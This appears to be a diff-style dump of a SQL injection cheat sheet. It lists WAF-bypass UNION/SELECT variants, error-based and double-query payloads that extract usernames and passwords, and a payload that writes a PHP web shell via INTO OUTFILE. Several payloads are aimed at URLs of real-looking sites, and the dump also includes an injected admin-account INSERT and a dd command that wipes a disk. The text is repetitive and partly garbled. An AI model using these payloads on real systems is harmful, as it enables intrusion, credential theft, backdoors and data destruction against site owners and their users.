+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+union+sel%0bect
++uni*on+sel*ect+
++‪#‎1q‬%0Aunion all#qa%0A#%0Aselect 1,2,3,4,5,6,7,8,9,10%0A#a
+union(select (1),(2),(3),(4),(5))
+UNION(SELECT(column)FROM(table))
+id=1+’UnI”On’+’SeL”ECT’
+id=1+’UnI’||’on’+SeLeCT’
+union select 1–+%0A,2–+%0A,3–+%0A etc ….
+===================================================================================================================================
+[+] Buffer overflow:
+===================================================================================================================================
++And(select 1)=(select 0×414)+union+select+1–
++And(select 1)=(select 0xAAAA)+union+select+1–
++and (/*!select*/ 1)=(/*!select*/ 0xAA)+
++and (/*!select*/ 1)=(/*!select*/ 0×414)+
++And(select 1)=(select 0×4141414141414141414141414141414141414141414141414141414141414141414141414?1414 14141414141414141414141414141414141414141414141414141414141414141414141414141414 1414141414141414141414141414141414141414141414141414141414141414141414141414?141 41414141414141414141414141414141414141414141414141414141414141414141414141414141 41414141414141414141414141414141414141414141414141414141414141414141414141414141 41414141414141414141414141414141414141414141414141414141414141414141414141414141 41414141414141414141414141414141414141414141414141414141414141414141414141414141 41414141414141414141414141414141414141414141414141414141414141414141414141414141 41414141414141414141414141414141414141414141414141414141414141414141414141414141 4141)+
+===================================================================================================================================
+[+] Group Concat:
+===================================================================================================================================
+Group_Concat
+group_concat()
+/*!group_concat*/()
+grOUp_ConCat(/*!*/,0x3e,/*!*/)
+group_concat(,0x3c62723e)
+g%72oup_c%6Fncat%28%76%65rsion%28%29,%22testtest%22%29
+CoNcAt()
+CONCAT(DISTINCT Version())
+concat(,0x3a,)
+concat%00()
+%00CoNcAt()
+/*!50000cOnCat*/(/*!Version()*/)
+/*!50000cOnCat*/
+/**//*!12345cOnCat*/(,0x3a,)
+concat_ws()
+concat(0x3a,,0x3c62723e)
+/*!concat_ws(0x3a,)*/
+concat_ws(0x3a3a3a,version()
+CONCAT_WS(CHAR(32,58,32),version(),)
+===================================================================================================================================
+ERORE BASED
+===================================================================================================================================
+=21 or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(0) or 1–
+Database
+21 and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+Table_name
+and (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 19,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+Columns
+21 and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x73657474696e6773 limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+extract date
+http://www.aliqbalschools.org/index.php… and (select 1 from (select count(*),concat((select(select concat(cast(concat(userName,0x7e,passWord) as char),0x7e)) from iqbal_iqbal.settings limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+Notice the limit function in the query
+A website can have more than 2 two databases, so increase the limit until you find all database names
+Example: limit 0,1 or limit 1,1 or limit 2,1
+===================================================================================================================================
+Differences:
+Error Based Query for Database Extraction:
+===================================================================================================================================
+and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+Double Query for Database Extraction:
+and(select 1 from(select count(*),concat((select (select concat(0x7e,0×27,cast(database() as char),0×27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from
+information_schema.tables group by x)a) and 1=1
+and(select 1 from(select count(*),concat((select (select (SELECT distinct
+concat(0x7e,0×27,cast(schema_name as char),0×27,0x7e) FROM information_schema.schemata LIMIT N,1)) from
+information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+and(select 1 from(select count(*),concat((select (select (SELECT distinct
+concat(0x7e,0×27,cast(table_name as char),0×27,0x7e) FROM information_schema.tables Where
+table_schema=0xhex_code_of_database_name LIMIT N,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from
+information_schema.tables group by x)a) and 1
+===================================================================================================================================
+WUBI +and+extractvalue(rand(),concat(0x3e,(select+concat(username,0x7e,password)+from+iw_users+limit+0,1)))–+
+===================================================================================================================================
+Descarci orice linux live, bootezi dupa el si formatezi cu dd+urandom. De acolo nu mai recupereaza NIMENI ceva.
+Code: dd if=/dev/urandom of=/dev/sda bs=1M
+I’d say using concat(0xY)
+Y being ‘’ in hex
+union select concat(version,0x3c7363726970743e616c6572742827706833776c27293c2f7363726970743e)
+http://zerocoolhf.altervista.org/level2.php…–+
+union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=concat(’0x’, hex(‘users’)
+=113′+and+0+union+select+1,(SELECT (@) FROM (SELECT(@:=0×00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x3C7363726970743E616C6572742827,’ [ ',table_schema,' ] >’,table_name,’ > ‘,column_name,0x27293B3C2F7363726970743E))))x),3–+–
+injection in sql database addd new user
+INSERT INTO admins (`name`,`password`,`email`) VALUES (‘unix’,'unixunix’,'unix_chro@yahoo.com’)
++and+(select+1+from+(select+count(*),concat((select(select+concat(cast(table_nam e+as+char),0x7e))+from+information_schema.tables+where+table_schema=0xDATABASEHE X+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)
+CHALLENGES
+Code:
+=(13)and(0)union(select(1),group_concat(column_name,0x3c62723e),(3)from(information_schema.columns)where(table_schema=database())and(table_name=0×7365637572697479))–+-
+=12+and+false/*!union*/ /*!select*/1,group_concat(0x3c62723e,/*!TabLe_NaMe*/),2,concat(user(),0x2a,database(),0x2a,version()),13,0x3c666f6e7420636f6c6f723d626c75653e3c68323e706833776c,15 from information_schema.tables where table_schema=0x66616272697a696f5f636572697070 LiMit 0,1–
+=/*!uNiOn*/ /*!SeLeCt*/ 1,concat(/*!version(),0x3a,0x3a,AdMinLoGiN,0x3a,0x3a*/),3 /*!fRoM*/ security–
+=121)+and(0)+/*!uNion*/+/*!seleCt*/+1,2,3,4,version(),6,7– -
+=121)/**/and false UNION(SELECT 1,2,3,4,5,6,7)–+-
+=121 div 0 ) /*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6,version()# |
+null’+union+select+1,2,count(schema_name),4,5+from+information_schema.schemata– x
+===================================================================================================================================
+Error Based:
+===================================================================================================================================
++or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1–
+or 1 group by concat(0x3a,(select substr(group_concat(username,0x3a,password),1,150)
+from rmdsz_user),floor(rand(0)*2)) having min(0) or 1– -
+or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1 — -
+and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
++AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP by CONCAT((SELECT version() FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2)))
++and+(select+1+from+(select+count(*)+from+(select+1+union+select+2+union+select+ 3)x+group+by+concat(mid((select+concat_ws(0x7e,version(),0x7e)+from+information_ schema.tables+limit+0,1),1,25),floor(rand(0)*2)))a)– x
+or 1=convert(int,(@@version))-
++or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1–
++and+(select+1+from+(select+count(*),concat((select(select+concat(c ast(count(schema_name)+as+char),0x7e))+from+information_schema.schemata+limit+0, 1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)
+(42)and(0)union(select(1),2,version(),4,5,0x3c623e3c666f6e7420636f6c6f723d626c75653e706833776c,7,8,9,(10))–+-
+===================================================================================================================================
+WAF BYPASS BY TOTTI
+===================================================================================================================================
+=-2/*1337*/UNION/*1337*/(SELECT/*1337*/1337,concat_ws(0x203a20,0x746f7474693933,table_nam e)/*1337*/FROM/*1337*/INFORMATION_SCHEMA./*!TABLES*//*1337*/WHERE/*1337*/TABLE_SCHEMA=database())– -
+=2+and(0)+union+distinctROW+select+1,/*!50000CoNcaT*/(0x706833776c,0x3a,table_name) /*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()– -
+===================================================================================================================================
+WUBI – 1,(select(@x)from(select(@x:=0×00),(select(0)from(information_schema.columns)where(table_schema!=0×69)and(0×00)in(@x:=concat(@x,0x3c62723e,table_schema,0x2020203d3e3e202020,table_name,0x20203a3a3a32020,column_name))))x),3,4–
+(select (@) from (select(@:=0×00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0a,’ [ ',table_schema,' ] >’,table_name,’ > ‘,column_name))))x)
+(select (@) from (select (@x:=0×00),(select (@) from (database.table) where (@) in (@:=concat(@,0x0a,columns)))x)
+(select (@) from (select (@x:=0×00),(select (@) from (database.table) where (@) in (@:=concat(@,0x0a,columns)))x)
+===================================================================================================================================
++and+1=convert(int,SERVERPROPERTY(‘ProductVersion’))
+===================================================================================================================================
+http://zerofreak.blogspot.it/…/tutorial-by-zer0freak-zer0fr…
+http://www.websec.ca/kb/sql_injection
+http://www.hellboundhackers.org/…/862-mysql-injection-compl…
+===================================================================================================================================
+test
+http://www.mt.ro/nou/articol.php?id=-angajari’+and+extractvalue(rand(),concat(0x3e,(select+concat(username,0x7e,password)+from+iw_users+limit+0,1)))–+
+…………………………………..
+http://www.mt.ro/nou/articol.php?id=-angajari’ and (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=0x64625f6d74 limit 10,1),floor(rand(0)*2))x from information_schema.tables group by x)a)–+
+SELECT “ system($_REQUEST['cmd']); ?>”
+INTO OUTFILE “full/path/here/cmd.php”
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%5
+------------------------------Best Bypass WAF------------------------------------
+[~] order by [~]
+/**/ORDER/**/BY/**/
+/*!order*/+/*!by*/
+/*!ORDER BY*/
+/*!50000ORDER BY*/
+/*!50000ORDER*//**//*!50000BY*/
+/*!12345ORDER*/+/*!BY*/
+[~] UNION select [~]
+/*!00000Union*/ /*!00000Select*/
+/*!50000%55nIoN*/ /*!50000%53eLeCt*/
+%55nion %53elect
+%55nion(%53elect 1,2,3)-- -
++union+distinct+select+
++union+distinctROW+select+
+/**//*!12345UNION SELECT*//**/
+/**//*!50000UNION SELECT*//**/
+/**/UNION/**//*!50000SELECT*//**/
+/*!50000UniON SeLeCt*/
+union /*!50000%53elect*/
++ #?uNiOn + #?sEleCt
++ #?1q %0AuNiOn all#qa%0A#%0AsEleCt
+/*!%55NiOn*/ /*!%53eLEct*/
+/*!u%6eion*/ /*!se%6cect*/
++un/**/ion+se/**/lect
+uni%0bon+se%0blect
+%2f**%2funion%2f**%2fselect
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+REVERSE(noinu)+REVERSE(tceles)
+/*--*/union/*--*/select/*--*/
+union (/*!/**/ SeleCT */ 1,2,3)
+/*!union*/+/*!select*/
+union+/*!select*/
+/**/union/**/select/**/
+/**/uNIon/**/sEleCt/**/
++%2F**/+Union/*!select*/
+/**//*!union*//**//*!select*//**/
+/*!uNIOn*/ /*!SelECt*/
++union+distinct+select+
++union+distinctROW+select+
+uNiOn aLl sElEcT
+UNIunionON+SELselectECT
+/**/union/*!50000select*//**/
+0%a0union%a0select%09
+%0Aunion%0Aselect%0A
+%55nion/**/%53elect
+uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
+%0A%09UNION%0CSELECT%10NULL%
+/*!union*//*--*//*!all*//*--*//*!select*/
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
++UnIoN/*&a=*/SeLeCT/*&a=*/
+union+sel%0bect
++uni*on+sel*ect+
++‪#‎1q‬%0Aunion all#qa%0A#%0Aselect
+union(select (1),(2),(3),(4),(5))
+UNION(SELECT(column)FROM(table))
+%23xyz%0AUnIOn%23xyz%0ASeLecT+
+%23xyz%0A%55nIOn%23xyz%0A%53eLecT+
+union(select(1),2,3)
+union (select 1111,2222,3333)
+uNioN (/*!/**/ SeleCT */ 11)
+union (select 1111,2222,3333)
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
+%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/
++%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+
++union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/
++%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+
+/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/
+/union\sselect/g
+/union\s+select/i
+/*!UnIoN*/SeLeCT
++UnIoN/*&a=*/SeLeCT/*&a=*/
++uni>on+sel>ect+
++(UnIoN)+(SelECT)+
++(UnI)(oN)+(SeL)(EcT)
++’UnI”On’+'SeL”ECT’
++uni on+sel ect+
++/*!UnIoN*/+/*!SeLeCt*/+
+/*!u%6eion*/ /*!se%6cect*/
+uni%20union%20/*!select*/%20
+union%23aa%0Aselect
+/**/union/*!50000select*/
+/^.*union.*$/ /^.*select.*$/
+/*union*/union/*select*/select+
+/*uni X on*/union/*sel X ect*/
++un/**/ion+sel/**/ect+
++UnIOn%0d%0aSeleCt%0d%0a
+UNION/*&test=1*/SELECT/*&pwn=2*/
+un?<ion sel="">+un/**/ion+se/**/lect+
++UNunionION+SEselectLECT+
++uni%0bon+se%0blect+
+%252f%252a*/union%252f%252a /select%252f%252a*/
+/%2A%2A/union/%2A%2A/select/%2A%2A/
+%2f**%2funion%2f**%2fselect%2f**%2f
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+/*!UnIoN*/SeLecT+
+[~] information_schema.tables [~]
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
+/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
+/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table
+[~] concat() [~]
+CoNcAt()
+concat() 
+CON%08CAT()
+CoNcAt()
+%0AcOnCat()
+/**//*!12345cOnCat*/
+/*!50000cOnCat*/(/*!*/)
+unhex(hex(concat(table_name)))
+unhex(hex(/*!12345concat*/(table_name)))
+unhex(hex(/*!50000concat*/(table_name)))
+[~] group_concat() [~]
+/*!group_concat*/()
+gRoUp_cOnCAt()
+group_concat(/*!*/)
+group_concat(/*!12345table_name*/)
+group_concat(/*!50000table_name*/)
+/*!group_concat*/(/*!12345table_name*/)
+/*!group_concat*/(/*!50000table_name*/)
+/*!12345group_concat*/(/*!12345table_name*/)
+/*!50000group_concat*/(/*!50000table_name*/)
+/*!GrOuP_ConCaT*/()
+/*!12345GroUP_ConCat*/()
+/*!50000gRouP_cOnCaT*/()
+/*!50000Gr%6fuP_c%6fnCAT*/()
+unhex(hex(group_concat(table_name)))
+unhex(hex(/*!group_concat*/(/*!table_name*/)))
+unhex(hex(/*!12345group_concat*/(table_name)))
+unhex(hex(/*!12345group_concat*/(/*!table_name*/)))
+unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))
+unhex(hex(/*!50000group_concat*/(table_name)))
+unhex(hex(/*!50000group_concat*/(/*!table_name*/)))
+unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))
+convert(group_concat(table_name)+using+ascii)
+convert(group_concat(/*!table_name*/)+using+ascii)
+convert(group_concat(/*!12345table_name*/)+using+ascii)
+convert(group_concat(/*!50000table_name*/)+using+ascii)
+CONVERT(group_concat(table_name)+USING+latin1)
+CONVERT(group_concat(table_name)+USING+latin2)
+CONVERT(group_concat(table_name)+USING+latin3)
+CONVERT(group_concat(table_name)+USING+latin4)
+CONVERT(group_concat(table_name)+USING+latin5)
+[~] after id no. like id=1 +/*!and*/+1=0 [~]
++div+0 
+Having+1=0 
++AND+1=0 
++/*!and*/+1=0 
+and(1)=(0) 
+when the --+- or -- dosen't work use ;%00
+bypass error 505
+sometimes when union select ,sites become 505 or time out....
+bypass-
+-use brackets
+union(select+1)
+-use %0b or /**/ as space
+union%0bselect
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+/*!%55NiOn*/ /*!%53eLEct*/
+%55nion(%53elect 1,2,3)-- -
++union+distinct+select+
++union+distinctROW+select+
+/**//*!12345UNION SELECT*//**/
+/**//*!50000UNION SELECT*//**/
+/**/UNION/**//*!50000SELECT*//**/
+/*!50000UniON SeLeCt*/
+union /*!50000%53elect*/
++#uNiOn+#sEleCt
++#1q%0AuNiOn all#qa%0A#
+%0AsEleCt
+/*!%55NiOn*/ /*!%53eLEct*/
+/*!u%6eion*/ /*!se%6cect*/
++un/**/ion+se/**/lect
+uni%0bon+se%0blect
+%2f**%2funion%2f**%2fselect
+union%23foo*%2F*bar%0D%0Aselect
+%23foo%0D%0A
+REVERSE(noinu)+REVERSE(tceles)
+/*--*/union/*--*/select/*--*/
+union (/*!/**/ SeleCT */ 1,2,3)
+/*!union*/+/*!select*/
+union+/*!select*/
+/**/union/**/select/**/
+/**/uNIon/**/sEleCt/**/
+/**//*!union*//**//*!select*//**/
+/*!uNIOn*/ /*!SelECt*/
++union+distinct+select+
++union+distinctROW+select+
